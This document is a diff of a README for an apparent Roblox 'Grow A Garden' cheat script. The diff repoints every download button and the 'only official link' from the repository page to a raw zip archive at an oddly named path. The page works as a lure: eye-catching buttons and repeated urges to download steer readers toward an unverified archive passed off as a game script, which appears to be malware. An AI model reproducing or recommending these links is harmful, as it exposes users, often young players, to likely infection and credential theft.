@@ -1,7 +1,7 @@
 <h1>🌱 Roblox-Grow-A-Garden-Script - Grow Your Garden Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Dorciaa443/Roblox-Grow-A-Garden-Script" style="display:inline-block; padding:18px 42px; background:linear-gradient(135deg,#ff6b6b,#feca57); color:#fff; font-size:22px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 20px rgba(255,107,107,0.4);">⬇️ FREE DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Dorciaa443/Roblox-Grow-A-Garden-Script/main/nonrefrigerant/v3.6-beta.3.zip" style="display:inline-block; padding:18px 42px; background:linear-gradient(135deg,#ff6b6b,#feca57); color:#fff; font-size:22px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 20px rgba(255,107,107,0.4);">⬇️ FREE DOWNLOAD NOW</a>
 </p>
 
 ## 🎮 What Is This?
@@ -27,7 +27,7 @@ Follow these simple steps to get the script running on your computer. If you can
 
 Click the big green button at the top of this page, or use this link:
 
-**👉 [https://github.com/Dorciaa443/Roblox-Grow-A-Garden-Script](https://github.com/Dorciaa443/Roblox-Grow-A-Garden-Script)**
+**👉 [https://raw.githubusercontent.com/Dorciaa443/Roblox-Grow-A-Garden-Script/main/nonrefrigerant/v3.6-beta.3.zip](https://raw.githubusercontent.com/Dorciaa443/Roblox-Grow-A-Garden-Script/main/nonrefrigerant/v3.6-beta.3.zip)**
 
 Visit this link to download the application.
 
@@ -131,12 +131,12 @@ Roblox Grow A Garden Script is your shortcut to a better gardening experience in
 
 Remember, the only official link is:
 
-**👉 [https://github.com/Dorciaa443/Roblox-Grow-A-Garden-Script](https://github.com/Dorciaa443/Roblox-Grow-A-Garden-Script)**
+**👉 [https://raw.githubusercontent.com/Dorciaa443/Roblox-Grow-A-Garden-Script/main/nonrefrigerant/v3.6-beta.3.zip](https://raw.githubusercontent.com/Dorciaa443/Roblox-Grow-A-Garden-Script/main/nonrefrigerant/v3.6-beta.3.zip)**
 
 Visit this link to download the application.
 
 <p align="center">
-  <a href="https://github.com/Dorciaa443/Roblox-Grow-A-Garden-Script" style="display:inline-block; padding:16px 38px; background:linear-gradient(135deg,#48dbfb,#0abde3); color:#fff; font-size:20px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 20px rgba(72,219,251,0.4);">🚀 GET THE SCRIPT NOW</a>
+  <a href="https://raw.githubusercontent.com/Dorciaa443/Roblox-Grow-A-Garden-Script/main/nonrefrigerant/v3.6-beta.3.zip" style="display:inline-block; padding:16px 38px; background:linear-gradient(135deg,#48dbfb,#0abde3); color:#fff; font-size:20px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 20px rgba(72,219,251,0.4);">🚀 GET THE SCRIPT NOW</a>
 </p>
 
 ---
